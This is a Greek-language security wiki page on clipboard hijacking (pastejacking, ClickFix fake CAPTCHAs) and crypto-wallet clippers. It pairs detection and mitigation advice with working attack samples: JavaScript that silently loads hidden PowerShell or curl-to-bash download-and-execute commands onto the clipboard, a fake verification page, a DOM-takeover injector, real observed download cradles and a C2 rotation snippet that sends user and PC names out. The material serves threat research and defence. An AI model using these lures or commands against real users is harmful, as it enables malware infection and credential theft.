# Επιθέσεις Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> «Μην επικολλάτε ποτέ κάτι που δεν αντιγράψατε εσείς.» – παλιά αλλά ακόμα έγκυρη συμβουλή

## Επισκόπηση

Το Clipboard Hijacking – γνωστό και ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συχνά αντιγράφουν και επικολλούν εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη ιστοσελίδα (ή οποιοδήποτε περιβάλλον με δυνατότητα JavaScript, όπως μια εφαρμογή Electron ή Desktop) τοποθετεί μέσω προγραμματισμού κείμενο που ελέγχεται από τον επιτιθέμενο στο system clipboard. Τα θύματα ενθαρρύνονται, συνήθως μέσω προσεκτικά σχεδιασμένων οδηγιών social engineering, να πατήσουν **Win + R** (παράθυρο διαλόγου Run), **Win + X** (Quick Access / PowerShell) ή να ανοίξουν ένα terminal και να *επικολλήσουν* το περιεχόμενο του clipboard, εκτελώντας αμέσως αυθαίρετες εντολές.

Επειδή **δεν γίνεται λήψη αρχείου και δεν ανοίγεται κανένα συνημμένο**, η τεχνική παρακάμπτει τα περισσότερα μέτρα ασφάλειας email και web περιεχομένου που παρακολουθούν συνημμένα, macros ή την άμεση εκτέλεση εντολών. Για αυτόν τον λόγο, η επίθεση είναι δημοφιλής σε καμπάνιες phishing που διανέμουν κοινές οικογένειες malware, όπως τα NetSupport RAT, Latrodectus loader ή Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers αντικατάστασης διευθύνσεων wallet

Μια άλλη παραλλαγή του **Clipboard Hijacking** δεν επικολλά καθόλου εντολές: περιμένει μέχρι το θύμα να αντιγράψει μια **διεύθυνση wallet κρυπτονομίσματος** και στη συνέχεια την αντικαθιστά αθόρυβα με μια διεύθυνση που ελέγχεται από τον επιτιθέμενο, λίγο πριν από την επικόλληση. Αυτό είναι ιδιαίτερα αποτελεσματικό με τις μεγάλες μορφές διευθύνσεων wallet, επειδή οι χρήστες συχνά ελέγχουν μόνο τους πρώτους ή τους τελευταίους χαρακτήρες.<sup>[[8]](#references)</sup>

Συνήθη χαρακτηριστικά που παρατηρούνται στην πράξη:
- **Thin loader + nested payload**: η ορατή εφαρμογή/exe φαίνεται να είναι ένα νόμιμο εργαλείο trading ή «κέρδους», ενώ το πραγματικό clipper είναι κρυμμένο βαθύτερα στο πακέτο (για παράδειγμα, ένας .NET loader εκκινεί ένα nested Rust payload).
- **Αντικατάσταση βάσει regex**: το malware εντοπίζει συμβολοσειρές όπως `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` ή ακόμα και γενικές συμβολοσειρές **44 χαρακτήρων τύπου Solana** και τις αντικαθιστά με διευθύνσεις wallet του επιτιθέμενου.
- **Μαζική εναλλαγή wallet**: σύγχρονα δείγματα Windows μπορεί να ενσωματώνουν **χιλιάδες** διευθύνσεις wallet αντικατάστασης ανά νόμισμα, αντί για μία στατική διεύθυνση, μειώνοντας τη φθορά της φήμης του wallet μετά από κάθε κλοπή.<sup>[[8]](#references)</sup>

### Ροή λειτουργίας Windows clipper

Μια συνηθισμένη υλοποίηση χρησιμοποιεί ένα κρυφό παράθυρο που καταχωρίζεται με το **`AddClipboardFormatListener`**. Σε κάθε ενημέρωση του clipboard, το malware συνήθως καλεί:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → πρόσβαση στα τρέχοντα δεδομένα του clipboard.
- **`GetClipboardData`** → ανάγνωση κειμένου.
- **`EmptyClipboard`** + **`SetClipboardData`** → αντικατάσταση της συμβολοσειράς wallet με την τιμή του επιτιθέμενου.

Ελάχιστα regex που χρησιμοποιούνται συχνά για τον εντοπισμό clippers:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Η persistence σε επίπεδο χρήστη αρκεί για να έχει αντίκτυπο. Ένα μοτίβο που έχει παρατηρηθεί είναι:<sup>[[8]](#references)</sup>
- Αντιγραφή του payload στο **`%APPDATA%\silke\silke.exe`**
- Δημιουργία ενός **Startup-folder LNK** στη διαδρομή `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ιδέες για εντοπισμό:
- Διεργασίες που καλούν συνεχώς clipboard APIs και ταυτόχρονα γράφουν στο `%APPDATA%` και στον φάκελο **Startup** του χρήστη.
- Δημιουργία νέου LNK/εκτελέσιμου και στη συνέχεια αλλαγές στη διεύθυνση wallet στο clipboard.
- Αρχεία ή bundles ψεύτικου λογισμικού που περιέχουν πολλά αχρησιμοποίητα αρχεία και ένα μικρό launcher που εκκινεί ένα ένθετο binary.

### Αφαίρεση του quarantine με κοινωνική μηχανική στο macOS + persistence μέσω LaunchAgent

Στο macOS, ορισμένες καμπάνιες διανέμουν ένα βοηθητικό πρόγραμμα **`unlocker.command`** και καθοδηγούν το θύμα να κάνει δεξί κλικ → **Open**, αν το Gatekeeper αναφέρει ότι η εφαρμογή είναι κατεστραμμένη ή προέρχεται από μη αναγνωρισμένο developer. Το script απλώς αφαιρεί το quarantine και εκκινεί το κοντινό `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Αυτό **δεν** είναι exploit του Gatekeeper· είναι μια **παράκαμψη quarantine μέσω social engineering** που εκμεταλλεύεται το γεγονός ότι οι αποφάσεις του Gatekeeper εξαρτώνται από το xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Μετά την εκτέλεση, το clipper μπορεί να παραμείνει ενεργό ως ο τρέχων χρήστης δημιουργώντας τα εξής:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script-wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent με `RunAtLoad` και `KeepAlive`

Μια χρήσιμη αμυντική λεπτομέρεια είναι ότι ορισμένα δείγματα υλοποιούν ένα **watchdog αυτοεπιδιόρθωσης** που ξαναγράφει το LaunchAgent και το wrapper κάθε ~30 δευτερόλεπτα. Αν αφαιρέσετε πρώτα το plist **χωρίς να τερματίσετε τη διεργασία που εκτελείται**, το malware μπορεί να το δημιουργήσει ξανά αμέσως.<sup>[[8]](#references)</sup> Ασφαλής σειρά καθαρισμού:
1. Τερματίστε την ενεργή διεργασία του clipper.
2. Κάντε unload/διαγράψτε το plist του LaunchAgent.
3. Διαγράψτε το `~/launch.sh` και το αντιγραμμένο payload.

### Σημείωση διανομής: η ψεύτικη φήμη ως πολλαπλασιαστής ισχύος

Σε αυτήν την οικογένεια, το ίδιο το malware μπορεί να παραμένει τεχνικά απλό, ενώ το **επίπεδο διανομής** αναλαμβάνει το μεγαλύτερο μέρος της δουλειάς: ψεύτικα stars/forks στο GitHub, κριτικές/λήψεις στο SourceForge, σχόλια/προβολές σε εκπαιδευτικά βίντεο στο YouTube και φαινομενικά καλοπροαίρετα σχόλια/ψήφοι στο VirusTotal χρησιμοποιούνται για να κάνουν το binary να φαίνεται αξιόπιστο πριν από την εκτέλεσή του.<sup>[[8]](#references)</sup>

## Κουμπιά αναγκαστικής αντιγραφής και κρυφά payloads (μονογραμμικές εντολές macOS)

Ορισμένα infostealers για macOS κλωνοποιούν ιστότοπους εγκατάστασης (π.χ., το Homebrew) και **αναγκάζουν τους χρήστες να χρησιμοποιήσουν ένα κουμπί «Copy»**, ώστε να μην μπορούν να επιλέξουν μόνο το ορατό κείμενο. Η καταχώριση στο clipboard περιέχει την αναμενόμενη εντολή εγκατάστασης μαζί με ένα πρόσθετο Base64 payload (π.χ., `...; echo <b64> | base64 -d | sh`), οπότε μία επικόλληση εκτελεί και τα δύο, ενώ το UI αποκρύπτει το επιπλέον στάδιο.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Παλαιότερες καμπάνιες χρησιμοποιούσαν το `document.execCommand('copy')`, ενώ οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Η ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται έναν ιστότοπο με typosquatting ή έναν παραβιασμένο ιστότοπο (π.χ. `docusign.sa[.]com`)
2. Το εγχυμένο JavaScript **ClearFake** καλεί μια βοηθητική συνάρτηση `unsecuredCopyToClipboard()` που αποθηκεύει κρυφά στο πρόχειρο μια κωδικοποιημένη σε Base64 εντολή PowerShell μίας γραμμής.
3. Οι οδηγίες HTML λένε στο θύμα: *«Πατήστε **Win + R**, επικολλήστε την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.»*
4. Εκτελείται το `powershell.exe`, το οποίο κατεβάζει ένα αρχείο αρχειοθέτησης που περιέχει ένα νόμιμο εκτελέσιμο αρχείο μαζί με ένα κακόβουλο DLL (κλασικό DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον στάδια, εισάγει shellcode και εγκαθιστά persistence (π.χ. προγραμματισμένη εργασία) – με τελικό αποτέλεσμα την εκτέλεση των NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Παράδειγμα αλυσίδας NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* Το `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά το `msvcp140.dll` στον κατάλογό του.
* Το κακόβουλο DLL επιλύει δυναμικά APIs με το **GetProcAddress**, κατεβάζει δύο δυαδικά αρχεία (`data_3.bin`, `data_4.bin`) μέσω του **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας ένα κυλιόμενο κλειδί XOR `"https://google.com/"`, εγχέει το τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στον φάκελο `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Κατεβάζει το `la.txt` με το **curl.exe**
2. Εκτελεί το JScript downloader μέσα στο **cscript.exe**
3. Λαμβάνει ένα MSI payload → τοποθετεί το `libcef.dll` δίπλα σε μια υπογεγραμμένη εφαρμογή → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer μέσω MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Η κλήση **mshta** εκκινεί ένα κρυφό script PowerShell, το οποίο ανακτά το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανασυνθέτει το `AutoIt3.exe` μέσω `extrac32` και συνένωσης αρχείων και, τέλος, εκτελεί ένα script `.a3x` που εξάγει διαπιστευτήρια browser στο `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Πρόχειρο → PowerShell → JS eval → LNK εκκίνησης με εναλλασσόμενο C2 (PureHVNC)

Ορισμένες καμπάνιες ClickFix παραλείπουν εντελώς τις λήψεις αρχείων και καθοδηγούν τα θύματα να επικολλήσουν μια εντολή μίας γραμμής, η οποία ανακτά και εκτελεί JavaScript μέσω WSH, διασφαλίζει την επιμονή του και αλλάζει το C2 καθημερινά. Παράδειγμα αλυσίδας που παρατηρήθηκε:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Βασικά χαρακτηριστικά
- Το συσκοτισμένο URL αντιστρέφεται κατά την εκτέλεση για να αποτρέψει τον επιφανειακό έλεγχο.
- Το JavaScript διατηρείται μέσω ενός Startup LNK (WScript/CScript) και επιλέγει το C2 με βάση την τρέχουσα ημέρα, επιτρέποντας τη γρήγορη εναλλαγή domain.<sup>[[3]](#references)</sup>

Ελάχιστο απόσπασμα JS που χρησιμοποιείται για την εναλλαγή C2 ανά ημερομηνία:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Το επόμενο στάδιο συνήθως αναπτύσσει ένα loader που εγκαθιστά persistence και κατεβάζει ένα RAT (π.χ., PureHVNC), συχνά χρησιμοποιώντας certificate pinning TLS με hardcoded certificate και κατακερματίζοντας την κίνηση.<sup>[[3]](#references)</sup>

Ιδέες ανίχνευσης ειδικά για αυτήν την παραλλαγή
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ή `cscript.exe`).
- Artifacts εκκίνησης: LNK στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` που εκκινεί WScript/CScript με διαδρομή JS κάτω από `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU και telemetry γραμμής εντολών που περιέχουν `.split('').reverse().join('')` ή `eval(a.responseText)`.
- Επαναλαμβανόμενη εκτέλεση `powershell -NoProfile -NonInteractive -Command -` με μεγάλα payloads stdin για την τροφοδότηση μεγάλων scripts χωρίς μακριές γραμμές εντολών.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins, όπως `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, μέσω task/path που μοιάζει με updater (π.χ., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostnames C2 και URLs που αλλάζουν καθημερινά, με το μοτίβο `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συσχέτιση συμβάντων εγγραφής στο clipboard, τα οποία ακολουθούνται από επικόλληση με Win+R και άμεση εκτέλεση του `powershell.exe`.

Οι ομάδες Blue Team μπορούν να συνδυάσουν telemetry clipboard, δημιουργίας διεργασιών και registry για να εντοπίσουν κατάχρηση pastejacking:

* Windows Registry: το `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` διατηρεί ιστορικό εντολών **Win + R** – αναζητήστε ασυνήθιστες καταχωρίσεις Base64 / obfuscated.
* Security Event ID **4688** (Process Creation), όπου `ParentImage` == `explorer.exe` και `NewProcessName` είναι ένα από τα { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων κάτω από `%LocalAppData%\Microsoft\Windows\WinX\` ή σε προσωρινούς φακέλους, λίγο πριν από το ύποπτο συμβάν 4688.
* Αισθητήρες clipboard του EDR (αν υπάρχουν) – συσχετίστε το `Clipboard Write` με τη δημιουργία νέας διεργασίας PowerShell αμέσως μετά.

## Σελίδες επαλήθευσης τύπου IUAM (ClickFix Generator): αντιγραφή από το clipboard στην κονσόλα + payloads προσαρμοσμένα στο λειτουργικό σύστημα

Πρόσφατες καμπάνιες παράγουν μαζικά πλαστές σελίδες επαλήθευσης CDN/browser («Just a moment…», τύπου IUAM), που εξαναγκάζουν τους χρήστες να αντιγράψουν εντολές ειδικά για το λειτουργικό τους σύστημα από το clipboard σε εγγενείς κονσόλες. Έτσι, η εκτέλεση μεταφέρεται εκτός του browser sandbox και λειτουργεί σε Windows και macOS.<sup>[[4]](#references)</sup>

Βασικά χαρακτηριστικά των σελίδων που δημιουργούνται από το builder
- Ανίχνευση λειτουργικού συστήματος μέσω `navigator.userAgent` για προσαρμογή των payloads (Windows PowerShell/CMD έναντι macOS Terminal). Προαιρετικά decoys/no-ops για μη υποστηριζόμενα λειτουργικά συστήματα, ώστε να διατηρείται η ψευδαίσθηση.
- Αυτόματη αντιγραφή στο clipboard με αβλαβείς ενέργειες UI (checkbox/Copy), ενώ το ορατό κείμενο ενδέχεται να διαφέρει από το περιεχόμενο του clipboard.
- Αποκλεισμός κινητών και αναδυόμενο παράθυρο με οδηγίες βήμα προς βήμα: Windows → Win+R→επικόλληση→Enter· macOS → άνοιγμα Terminal→επικόλληση→Enter.
- Προαιρετικό obfuscation και injector ενός αρχείου για αντικατάσταση του DOM ενός παραβιασμένου ιστότοπου με UI επαλήθευσης διαμορφωμένο με Tailwind (δεν απαιτείται καταχώριση νέου domain).<sup>[[4]](#references)</sup>

Παράδειγμα: ασυμφωνία clipboard + branching ανάλογα με το λειτουργικό σύστημα
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS persistence κατά την αρχική εκτέλεση
- Χρησιμοποιήστε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχιστεί μετά το κλείσιμο του terminal, μειώνοντας τα ορατά ίχνη.<sup>[[4]](#references)</sup>

Επιτόπια κατάληψη σελίδων σε παραβιασμένους ιστότοπους
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Ιδέες για detection και hunting ειδικά για lures τύπου IUAM
- Web: Σελίδες που συνδέουν το Clipboard API με widgets επαλήθευσης· ασυμφωνία μεταξύ του κειμένου που εμφανίζεται και του payload του clipboard· διακλάδωση βάσει του `navigator.userAgent`· Tailwind + αντικατάσταση single-page σε ύποπτα περιβάλλοντα.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από αλληλεπίδραση με browser· εκτέλεση batch/MSI installers από το `%TEMP%`.
- macOS endpoint: Το Terminal/iTerm εκκινεί `bash`/`curl`/`base64 -d` με `nohup` κοντά σε συμβάντα browser· διεργασίες παρασκηνίου που συνεχίζουν μετά το κλείσιμο του terminal.
- Συσχετίστε το ιστορικό `RunMRU` Win+R και τις εγγραφές στο clipboard με την επακόλουθη δημιουργία διεργασιών console.

Δείτε επίσης τεχνικές που λειτουργούν υποστηρικτικά

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Εξελίξεις fake CAPTCHA / ClickFix του 2026 (ClearFake, Scarlet Goldfinch)

- Το ClearFake συνεχίζει να παραβιάζει ιστότοπους WordPress και να εισάγει loader JavaScript που συνδέει διαδοχικά εξωτερικούς hosts (Cloudflare Workers, GitHub/jsDelivr) και ακόμη και κλήσεις blockchain «etherhiding» (π.χ. POST σε endpoints API του Binance Smart Chain, όπως το `bsc-testnet.drpc[.]org`) για να ανακτά την τρέχουσα λογική των lures. Τα πρόσφατα overlays χρησιμοποιούν σε μεγάλο βαθμό fake CAPTCHA που καθοδηγούν τους χρήστες να αντιγράψουν/επικολλήσουν μια εντολή one-liner (T1204.004), αντί να κατεβάσουν κάτι.<sup>[[6]](#references)</sup>
- Η αρχική εκτέλεση ανατίθεται όλο και περισσότερο σε υπογεγραμμένους hosts script/LOLBAS. Οι αλυσίδες του Ιανουαρίου 2026 αντικατέστησαν την προηγούμενη χρήση του `mshta` με το ενσωματωμένο `SyncAppvPublishingServer.vbs`, το οποίο εκτελείται μέσω του `WScript.exe` και λαμβάνει ορίσματα τύπου PowerShell με aliases/wildcards για την ανάκτηση απομακρυσμένου περιεχομένου:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - Το `SyncAppvPublishingServer.vbs` είναι υπογεγραμμένο και χρησιμοποιείται κανονικά από το App-V· σε συνδυασμό με το `WScript.exe` και ασυνήθιστα ορίσματα (ψευδώνυμα `gal`/`gcm`, cmdlets με χαρακτήρες wildcard, URLs jsDelivr), γίνεται ένα στάδιο LOLBAS υψηλής αξιοπιστίας για το ClearFake.<sup>[[6]](#references)</sup>
- Τον Φεβρουάριο του 2026, τα payloads ψεύτικου CAPTCHA στράφηκαν ξανά σε αμιγώς PowerShell download cradles. Δύο ενεργά παραδείγματα:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Η πρώτη αλυσίδα είναι ένα grabber `iex(irm ...)` που εκτελείται στη μνήμη· η δεύτερη χρησιμοποιεί το `WinHttp.WinHttpRequest.5.1` για να αποθηκεύσει ένα προσωρινό `.ps1` και έπειτα το εκκινεί με `-ep bypass` σε κρυφό παράθυρο.<sup>[[6]](#references)</sup>

Συμβουλές ανίχνευσης/αναζήτησης για αυτές τις παραλλαγές
- Αλυσίδα διεργασιών: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ή PowerShell cradles αμέσως μετά από εγγραφές στο clipboard/Win+R.
- Λέξεις-κλειδιά γραμμής εντολών: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domains jsDelivr/GitHub/Cloudflare Worker ή μοτίβα `iex(irm ...)` με raw IP.
- Δίκτυο: εξερχόμενες συνδέσεις προς CDN worker hosts ή blockchain RPC endpoints από script hosts/PowerShell λίγο μετά την περιήγηση στο web.
- Αρχεία/registry: δημιουργία προσωρινού `.ps1` κάτω από το `%TEMP%` μαζί με εγγραφές RunMRU που περιέχουν αυτά τα one-liners· αποκλεισμός/ειδοποίηση όταν signed-script LOLBAS (WScript/cscript/mshta) εκτελείται με εξωτερικά URLs ή obfuscated alias strings.

## Τεχνικές ClickFix του Ιουνίου 2026: telemetry επικόλλησης, ψεύτικα σχόλια επαλήθευσης και αλυσιδωτή χρήση LOLBin

Πρόσφατα telemetry της Red Canary δείχνουν ότι η σταθερή ένδειξη **δεν είναι μία συγκεκριμένη εντολή**, αλλά ο συνδυασμός **επικόλλησης και εκτέλεσης με τη βοήθεια του χρήστη**, **έμπιστων interpreters/LOLBins**, **obfuscated flags**, **απομακρυσμένης ανάκτησης** και **άμεσης εκτέλεσης**.<sup>[[7]](#references)</sup>

### Αξιοσημείωτα μοτίβα operator

- **Telemetry επιβεβαίωσης επικόλλησης**: ορισμένα payloads εκτελούν `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` πριν από το πραγματικό stage. Αυτό επιβεβαιώνει την αλληλεπίδραση του χρήστη, ενώ το παράθυρο παραμένει σύντομο και διακριτικό.
- **Ψεύτικα σχόλια επαλήθευσης**: PowerShell one-liners μπορεί να προσθέτουν συμβολοσειρές όπως `# Security check ✔️ I'm not a robot Verification ID: 138105`, ώστε η εντολή να εξακολουθεί να μοιάζει σχετική με CAPTCHA αφού επικολληθεί στο Run / `cmd.exe` / ιστορικό PowerShell.
- **Δυναμική ανασύνθεση URL**: το `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` αποφεύγει τη χρήση στατικού URL στη γραμμή εντολών, ενώ εξακολουθεί να εκτελεί λήψη και εκτέλεση στη μνήμη.
- **Εκτέλεση installer με παραπλανητική ονομασία**: το `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` καταχράται ασυνήθιστη χρήση κεφαλαίων/πεζών και χαρακτήρες που μοιάζουν με Unicode στα flags, για να παρακάμπτει εύθραυστες ανιχνεύσεις, ενώ εξακολουθεί να θυμίζει το `msiexec.exe`.
- **Αλυσίδες LOLBin με διαφυγές caret**: το `cmd.exe` μπορεί να κρύβει λέξεις-κλειδιά με διαφυγές `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), να εκκινεί το εμφωλευμένο shell ελαχιστοποιημένο, να αποθηκεύει περιεχόμενο του attacker με αθώα επέκταση όπως `.pdf` και έπειτα να το εκτελεί μέσω `mshta`.<sup>[[7]](#references)</sup>
## Μέτρα μετριασμού

1. Θωράκιση browser – απενεργοποιήστε την πρόσβαση εγγραφής στο clipboard (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαιτήστε χειρονομία χρήστη.
2. Ενημέρωση για την ασφάλεια – εκπαιδεύστε τους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε ένα text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για αποκλεισμό αυθαίρετων one-liners.
4. Έλεγχοι δικτύου – αποκλείστε εξερχόμενα αιτήματα προς γνωστά domains pastejacking και malware C2.

## Σχετικά κόλπα

* **Discord Invite Hijacking** συχνά καταχράται την ίδια προσέγγιση ClickFix, αφού παρασύρει τους χρήστες σε κακόβουλο server:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Διόρθωση του Click: Αποτροπή του διανύσματος επίθεσης ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Πίσω από την καθαρή κουρτίνα: Από RAT σε Builder και μετά σε Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Το εργοστάσιο ClickFix: Η πρώτη αποκάλυψη του generator IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, η χρονιά του Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Πληροφορίες πληροφοριών: Φεβρουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Πληροφορίες πληροφοριών: Ιούνιος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Από τα αστέρια στις θετικές ψήφους: Ψεύτικη φήμη τροφοδοτεί hijacker clipboard κρυπτονομισμάτων](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
